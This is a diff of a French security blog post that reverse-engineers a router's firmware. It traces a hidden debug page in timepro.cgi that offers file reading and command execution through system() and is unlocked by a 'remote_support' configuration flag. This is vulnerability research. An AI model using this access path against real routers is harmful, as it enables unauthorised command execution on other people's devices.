@@ -491,18 +758,15 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl"> +---------------------------------------------------------------+
 </span></span><span class="line"><span class="cl"> |                      Partition offset[2]                      |
 </span></span><span class="line"><span class="cl"> +---------------------------------------------------------------+
-</span></span></code></pre></div><blockquote>
-<p>Source : <a
-  class="gblog-markdown__link"
-  href="https://git.archive.openwrt.org/?p=14.07/openwrt.git;a=blob;f=tools/firmware-utils/src/trx.c;h=aa1f5be4b65b66ac9a1a48d7304d9bef131080e1;hb=HEAD#l69"
->openwrt/tools/firmware-utils/src/trx.c</a></p></blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file extractions/firmware.bin.extracted/20000/*
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> // Source : openwrt/tools/firmware-utils/src/trx.c
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file extractions/firmware.bin.extracted/20000/*
 </span></span><span class="line"><span class="cl">extractions/firmware.bin.extracted/20000/partition_0.bin: LZMA compressed data, non-streamed, size <span class="m">4276224</span>
 </span></span><span class="line"><span class="cl">extractions/firmware.bin.extracted/20000/partition_1.bin: Linux Compressed ROM File System data, little endian size <span class="m">1740800</span> version <span class="c1">#2 sorted_dirs CRC 0xe66d68a8, edition 0, 1334 blocks, 247 files</span>
 </span></span></code></pre></div><p>On peut voir que <em>Binwalk</em> a identifié et extrait deux partitions dans le conteneur <em>TRX</em> :</p>
 <ol>
 <li><strong>partition_0.bin :</strong> une autre archive compressée en <em>LZMA</em></li>
-<li><strong>partition_1.bin :</strong> un système de fichier du type <a
+<li><strong>partition_1.bin :</strong> un système de fichiers du type <a
   class="gblog-markdown__link"
   href="https://fr.wikipedia.org/wiki/Cramfs"
 >CRAMFS (Compressed ROM/RAM File System)</a></li>
@@ -510,7 +774,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 <p>Encore une fois concentrons nous sur <em>partition_1.bin</em> qui contient le système de fichiers. Pour extraire son contenu, il est possible d&rsquo;utiliser <a
   class="gblog-markdown__link"
   href="https://7-zip.org/"
->7z</a> qui supporte le format <em>CramFs</em></p>
+>7z</a> qui supporte le format <em>CRAMFS</em></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ 7z x extractions/firmware.bin.extracted/20000/partition_1.bin -o/tmp/firm_fs/
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
@@ -569,7 +833,15 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> skander skander  <span class="m">4096</span> mai   <span class="m">10</span> 21:11 tmp
 </span></span><span class="line"><span class="cl">drwx------  <span class="m">4</span> skander skander  <span class="m">4096</span> mai   <span class="m">10</span> 21:11 usr
 </span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> skander skander     <span class="m">8</span> mai   <span class="m">10</span> 21:11 var
-</span></span></code></pre></div><div class="flex align-center gblog-post__anchorwrap">
+</span></span></code></pre></div>
+
+
+<blockquote class="gblog-hint note">
+  <div class="gblog-hint__title flex align-center"><i class="fa note" title="Note"></i></div>
+  <div class="gblog-hint__text"><em>Binwalk</em> offre d&rsquo;autres paramètres intéressants dont &ldquo;-M/&ndash;matryoshka&rdquo; qui permet de réaliser une analyse récursive.</div>
+</blockquote>
+
+<div class="flex align-center gblog-post__anchorwrap">
     <h2 id="mapping-du-code-source"
     >
         Mapping du code source
@@ -578,7 +850,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Maintenant que nous avons un accès à l&rsquo;ensemble des éléments présents dans le système de fichiers, il est necessaire d&rsquo;identifier les fichiers contenant la partie applicative du router. Pour cela, le fichier de configuration du serveur web peut être un bon début :</p>
+<p>Maintenant que nous avons un accès à l&rsquo;ensemble des éléments présents dans le système de fichiers, il est nécessaire d&rsquo;identifier les fichiers contenant le code applicatif du routeur. Pour cela, le fichier de configuration du serveur web peut être un bon début :</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat default/var/boa_vh.conf
 </span></span><span class="line"><span class="cl">Port <span class="m">80</span>
 </span></span><span class="line"><span class="cl">User root
@@ -610,7 +882,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 <li>Il y&rsquo;a <strong>plusieurs répertoires qui sont exposés</strong>, donnant la possibilité d&rsquo;exécuter les programmes <a
   class="gblog-markdown__link"
   href="https://fr.wikipedia.org/wiki/Common_Gateway_Interface"
->CGI</a> qui y sont présents</li>
+>CGI</a> qui y sont présents <em>(de manière non authentifiée pour certains)</em></li>
 </ul>
 <div class=table-wrap> <table>
   <thead>
@@ -653,49 +925,60 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
       </tr>
   </tbody>
 </table> </div>
-<p>Maintenant qu&rsquo;on a une vue globale sur le mapping réalisé par le serveur HTTP, on peut commencer à inspecter le contenu des différents répertoires exposés.</p>
-<div class="flex align-center gblog-post__anchorwrap">
-    <h2 id="un-air-de-déjà-vue"
-    >
-        Un air de déjà vue
-    </h2>
-    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#un-air-de-déjà-vue" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Un air de déjà vue" href="#un-air-de-d%c3%a9j%c3%a0-vue">
-        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-    </a>
-</div>
-<p>Si on reprend l&rsquo;ordre du précédent tableau, on peut commencer par analyser le contenu du répertoire <em>/bin</em></p>
-<blockquote>
-<p><strong>Rappel :</strong> à la différence de <a
+<p>Maintenant que nous avons une vue globale sur le mapping réalisé par le serveur HTTP, on peut commencer à inspecter le contenu des différents répertoires exposés.</p>
+
+
+
+<blockquote class="gblog-hint note">
+  <div class="gblog-hint__title flex align-center"><i class="fa note" title="Note"></i></div>
+  <div class="gblog-hint__text"><strong>Rappel :</strong> à la différence de <a
   class="gblog-markdown__link"
   href="https://httpd.apache.org/docs/2.4/fr/mod/mod_alias.html#alias"
 >Alias</a>, la directive <a
   class="gblog-markdown__link"
   href="https://httpd.apache.org/docs/2.4/fr/mod/mod_alias.html#scriptalias"
->ScriptAlias</a> permet de spécifier un répertoire cible contenant des scripts CGI allant être traîtées par le gestionnaire <em>cgi-script</em>. Il n&rsquo;est donc pas possible d&rsquo;exécuter et lire un autre type de fichier et c&rsquo;est pour cela qu&rsquo;on va se concentrer uniquement sur ce format durant l&rsquo;analyse des différents répertoires.</p></blockquote>
+>ScriptAlias</a> permet de spécifier un répertoire cible contenant des scripts CGI allant être traîtées par le gestionnaire <em>cgi-script</em>. Il n&rsquo;est donc pas possible d&rsquo;exécuter ou lire un autre type de fichier et c&rsquo;est pour cela qu&rsquo;on va se concentrer uniquement sur ce format durant l&rsquo;analyse des différents répertoires.</div>
+</blockquote>
+
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="un-air-de-déjà-vu"
+    >
+        Un air de déjà vu
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#un-air-de-déjà-vu" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Un air de déjà vu" href="#un-air-de-d%c3%a9j%c3%a0-vu">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<p>Si on reprend l&rsquo;ordre du précédent tableau, on peut commencer par analyser le contenu du répertoire <em>/bin</em></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file bin/*.cgi
 </span></span><span class="line"><span class="cl">bin/d.cgi:          ASCII text, with no line terminators
 </span></span><span class="line"><span class="cl">bin/timepro.cgi:    ELF 32-bit LSB executable, MIPS, MIPS-I version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
 </span></span><span class="line"><span class="cl">bin/upgrade.cgi:    ELF 32-bit LSB executable, MIPS, MIPS-I version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
 </span></span><span class="line"><span class="cl">bin/wps_wizard.cgi: ELF 32-bit LSB executable, MIPS, MIPS-I version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
-</span></span></code></pre></div><p>Procédons encore une fois par odre. Une simple <em>cat</em> <em>(sachant que c&rsquo;est un fichier comportant uniquement du text)</em> sur <em>d.cgi</em> nous revèle qu&rsquo;il pointe vers <em>timepro.cgi</em></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat bin/d.cgi                                                                                                                                                               skander@mainlab
+</span></span></code></pre></div><p>Procédons encore une fois par ordre. Une simple <em>cat</em> sur <em>d.cgi</em> <em>(sachant que c&rsquo;est un fichier comportant uniquement du text)</em> nous revèle qu&rsquo;il pointe vers <em>timepro.cgi</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat bin/d.cgi
 </span></span><span class="line"><span class="cl">/bin/timepro.cgi
-</span></span></code></pre></div><p>Vient le tour de <em>timepro.cgi</em> qui en passant est le script observé durant l&rsquo;utilisation de l&rsquo;espace d&rsquo;administration du routeur. On peut partir sur l&rsquo;hypothèse que c&rsquo;est le script principal et son analyse est donc essentiel durant cette recherche.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ rabin2 -I bin/timepro.cgi                                                                                                                                               <span class="m">1</span> ↵ <span class="nv">$skander</span>@mainlab
+</span></span></code></pre></div><p>Vient le tour de <em>timepro.cgi</em> qui en passant est le script observé durant l&rsquo;utilisation de l&rsquo;espace d&rsquo;administration du routeur. On peut partir sur l&rsquo;hypothèse que c&rsquo;est le script principal pour la partie web. Son analyse est donc essentielle pour cette recherche.</p>
+<figure style="text-align: center;"><img src="/img/toto/web-portal-timepro.png" /><figcaption style="text-align: center;">/cgi-bin/timepro.cgi</figcaption></figure>
+<p>Une fois l&rsquo;architecture bien confirmée avec <a
+  class="gblog-markdown__link"
+  href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/"
+>rabin2</a>, on peut passer le binaire à un désassembleur/décompilateur.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ rabin2 -I bin/timepro.cgi
 </span></span><span class="line"><span class="cl">r2pm -ci r2ghidra
-</span></span><span class="line"><span class="cl">arch     mips
+</span></span><span class="line hl"><span class="cl">arch     mips
 </span></span><span class="line"><span class="cl">cpu      mips1
 </span></span><span class="line"><span class="cl">baddr    0x400000
 </span></span><span class="line"><span class="cl">binsz    <span class="m">661584</span>
-</span></span><span class="line"><span class="cl">bintype  elf
-</span></span><span class="line"><span class="cl">bits     <span class="m">32</span>
+</span></span><span class="line hl"><span class="cl">bintype  elf
+</span></span><span class="line hl"><span class="cl">bits     <span class="m">32</span>
 </span></span><span class="line"><span class="cl">canary   <span class="nb">false</span>
 </span></span><span class="line"><span class="cl">injprot  <span class="nb">false</span>
 </span></span><span class="line"><span class="cl">class    ELF32
 </span></span><span class="line"><span class="cl">flags    0x5
 </span></span><span class="line"><span class="cl">abi      o32
 </span></span><span class="line"><span class="cl">crypto   <span class="nb">false</span>
-</span></span><span class="line"><span class="cl">endian   little
+</span></span><span class="line hl"><span class="cl">endian   little
 </span></span><span class="line"><span class="cl">havecode <span class="nb">true</span>
 </span></span><span class="line"><span class="cl">intrp    /lib/ld-uClibc.so.0
 </span></span><span class="line"><span class="cl">laddr    0x0
@@ -714,11 +997,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">stripped <span class="nb">true</span>
 </span></span><span class="line"><span class="cl">subsys   linux
 </span></span><span class="line"><span class="cl">va       <span class="nb">true</span>
-</span></span></code></pre></div><p>Une fois l&rsquo;architecture bien confirmée avec <a
-  class="gblog-markdown__link"
-  href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/"
->rabin2</a>, on peut passer le binaire à un désassembleur/décompilateur.</p>
-<div class="flex align-center gblog-post__anchorwrap">
+</span></span></code></pre></div><div class="flex align-center gblog-post__anchorwrap">
     <h2 id="analyse-du-fichier"
     >
         Analyse du fichier
@@ -727,7 +1006,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Une fois le binaire importé et analysé dans <a
+<p>Le binaire importé dans <a
   class="gblog-markdown__link"
   href="https://ghidra-sre.org/"
 >Ghidra</a>, commençons par le plus simple et qui est d&rsquo;analyser la fonction <em>main</em>. Ci-dessous une partie du pseudo-code obtenu après décompilation :</p>
@@ -798,8 +1077,16 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">_DAT_000003e0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>On peut clairement appercevoir une référence au chemin <strong>/bin/d.cgi</strong> ainsi qu&rsquo;un appel à la fonction <strong>show_debug_screen(param_2)</strong> si la condition est satisfaite. Ayant un nom intéressant, faisons donc le même exercice d&rsquo;analyse pour cette fonction.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">show_debug_screen</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">)</span>
+</span></span></code></pre></div><p>On peut clairement appercevoir une référence au chemin <strong>/bin/d.cgi</strong> ainsi qu&rsquo;un appel à la fonction <strong>show_debug_screen(param_2)</strong>. Ayant un nom intéressant, faisons donc le même exercice d&rsquo;analyse pour cette fonction.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="8d2da5f0-6">
+    <span>Pseudo-code complet de show_debug_screen</span>
+    <span>↕</span>
+  </label>
+  <input id="8d2da5f0-6" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">show_debug_screen</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
@@ -914,35 +1201,39 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>On peut voir qu&rsquo;il y a différents éléments intéressants :</p>
+</span></span></code></pre></div>
+  </div>
+</div>
+
+<p>On peut voir qu&rsquo;il y a différents éléments intéressants :</p>
 <ul>
-<li>La fonction renvoie un formulaire HTML contenant des <em>inputs</em> intéressants tels que <em>File Name</em> ou <em>Command Name</em></li>
-<li>La fonction appelle des fonctions intéressantes telles que <em>fopen</em> et <em>system</em> utilisées respectivement pour l&rsquo;ouverture de fichiers et l&rsquo;exécution de commande</li>
-<li>La fonction contient une suite de conditions pour atteindre les deux précédents points</li>
+<li>La fonction renvoie un <strong>formulaire HTML contenant des <em>inputs</em> suspects tels que <em>File Name</em> ou <em>Command Name</em></strong></li>
+<li>La fonction appelle des fonctions également suspectes telles que <strong><em>fopen</em> et <em>system</em> utilisées respectivement pour l&rsquo;ouverture de fichiers et l&rsquo;exécution de commandes</strong></li>
+<li>La fonction contient une <strong>suite de conditions pour atteindre les deux précédents points</strong></li>
 </ul>
 <p>La prochaine étape aura donc pour objectif de vérifier chacunes des conditions afin de pouvoir atteindre cette &ldquo;page de debug&rdquo;.</p>
 <div class="flex align-center gblog-post__anchorwrap">
-    <h3 id="option"
+    <h3 id="une-option-pas-si-optionnelle"
     >
-        Option
+        Une option pas si optionnelle
     </h3>
-    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#option" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Option" href="#option">
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#une-option-pas-si-optionnelle" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Une option pas si optionnelle" href="#une-option-pas-si-optionnelle">
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Si on reprend le début de la fonction <em>show_debug_screen</em>, on peut remarquer un appel à la fonction <em>get_remote_support()</em>. La valeur renvoyée par cette dernière devra correspondre à 0 afin de satistaire une des conditions d&rsquo;entrée au bloc cible. Analysons donc cette fonction en incluant ses appels à la chaîne :</p>
+<p>Si on reprend le début de la fonction <em>show_debug_screen</em>, on peut remarquer un appel à la fonction <em>get_remote_support()</em>. La valeur renvoyée par cette dernière devra correspondre à 0 afin de satisfaire une des conditions d&rsquo;entrée au bloc cible. Analysons donc cette fonction en incluant ses appels à la chaîne :</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_remote_support</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">iconfig_get_intvalue_direct</span><span class="p">(</span><span class="s">&#34;remote_support&#34;</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">iconfig_get_intvalue_direct</span><span class="p">(</span><span class="s">&#34;remote_support&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">iVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">iVar2</span><span class="p">;</span>
+</span></span><span class="line hl"><span class="cl">  <span class="k">return</span> <span class="n">iVar2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">iconfig_get_intvalue_direct</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -951,12 +1242,12 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">acStack_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">iconfig_get_value_direct</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">acStack_28</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">iconfig_get_value_direct</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">acStack_28</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">iVar2</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">iVar2</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">acStack_28</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">iVar2</span><span class="p">;</span>
+</span></span><span class="line hl"><span class="cl">  <span class="k">return</span> <span class="n">iVar2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">iconfig_get_value_direct</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined1</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -969,8 +1260,8 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">local_1c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="nf">lock_file</span><span class="p">(</span><span class="s">&#34;/etc/iconfig.cfg&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">genconfig_read_file</span><span class="p">(</span><span class="s">&#34;/etc/iconfig.cfg&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">iVar2</span> <span class="o">=</span> <span class="nf">genconfig_get_value</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">,</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">genconfig_read_file</span><span class="p">(</span><span class="s">&#34;/etc/iconfig.cfg&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="n">iVar2</span> <span class="o">=</span> <span class="nf">genconfig_get_value</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">,</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">genconfig_free_ll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -988,11 +1279,13 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">  <span class="nf">genconfig_free_ll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Il est possible de résumer tout cela par le fait que <em>get_remote_support</em> vérifie que la valeur du paramètre <em>remote_support</em> est différente de 0 dans le fichier de configuration du routeur <em>/etc/ifconfig.cfg</em> en saidant des fonctions <em>iconfig_get_intvalue_direct</em> et <em>ifconfig_get_value_direct</em>. Dans le cas échéant, <em>get_remote_support</em> renvoie 0 est une partie de la condition est satisfaite. Il faudra donc trouver un moyen de modifier cette valeur de la configuration du routeur.</p>
-<p>Une des idées serait de télécharger la configuration actuelle du routeur avec la fonctionnalité prévue pour, modifier l&rsquo;option puis mettre à jour la configuration. Néanmoins, après le téléchargement de la sauvegarde du routeur, on peut vite voir que le fichier n&rsquo;est pas directement modifiable. Une nième analyse s&rsquo;impose donc.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file config.cfg                                                                                                                                                                     skander@mainlab
+</span></span></code></pre></div><p>Il est possible de résumer tout cela par le fait que <em>get_remote_support</em> vérifie que la valeur du paramètre <em>remote_support</em> est différente de 0 dans le fichier de configuration du routeur <em>/etc/ifconfig.cfg</em> en saidant des fonctions <em>iconfig_get_intvalue_direct</em> et <em>ifconfig_get_value_direct</em>. Dans le cas échéant, <em>get_remote_support</em> renvoie 0 et une partie de la condition est satisfaite. Il faudra donc trouver un moyen de modifier cette valeur dans la configuration du routeur.</p>
+<p>Ne trouvant aucune mention de cette option dans le pannel d&rsquo;administration, une des idées était de télécharger la configuration actuelle du routeur avec la fonctionnalité <em>Config Backup</em>, modifier ou ajouter l&rsquo;option <em>remote_support</em> puis mettre à jour la configuration grâce à la fonctionnalité <em>Config restore</em>.</p>
+<figure style="text-align: center;"><img src="/img/toto/web-portal-backup.png" /><figcaption style="text-align: center;">Téléchargement d'une copie de la configuration</figcaption></figure>
+<p>Après le téléchargement de la sauvegarde du routeur, on peut voir qu&rsquo;il s&rsquo;agit d&rsquo;une archive <em>gzip</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file config.cfg
 </span></span><span class="line"><span class="cl">config.cfg: gzip compressed data, last modified: Sat Jan  <span class="m">1</span> 00:00:02 2000, max compression, from Unix, original size modulo 2^32 <span class="m">3384</span>
-</span></span><span class="line"><span class="cl">$ 7z x config.cfg                                                                                                                                                               <span class="m">127</span> ↵ skander@mainlab
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ 7z x config.cfg
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
 </span></span><span class="line"><span class="cl">p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,8 CPUs 11th Gen Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i7-1165G7 @ 2.80GHz <span class="o">(</span>806C1<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
@@ -1010,24 +1303,27 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Size:       <span class="m">3384</span>
 </span></span><span class="line"><span class="cl">Compressed: <span class="m">3379</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">$ file config                                                                                                                                                                         skander@mainlab
+</span></span></code></pre></div><p>Néanmoins, une fois le fichier initial décompressé, nous nous retrouvons avec un format de fichier inconnu et <em>n-ième</em> analyse nous est donc imposée.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file config
 </span></span><span class="line"><span class="cl">config: data
-</span></span><span class="line"><span class="cl">$ xxd -l <span class="m">20</span> config                                                                                                                                                                    skander@mainlab
-</span></span><span class="line"><span class="cl">00000000: <span class="m">7261</span> 775f 6e76 <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  raw_nv..........
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ xxd -l <span class="m">20</span> config
+</span></span><span class="line hl"><span class="cl">00000000: <span class="m">7261</span> 775f 6e76 <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> raw_nv..........
 </span></span><span class="line"><span class="cl">00000010: 080d <span class="m">0000</span>
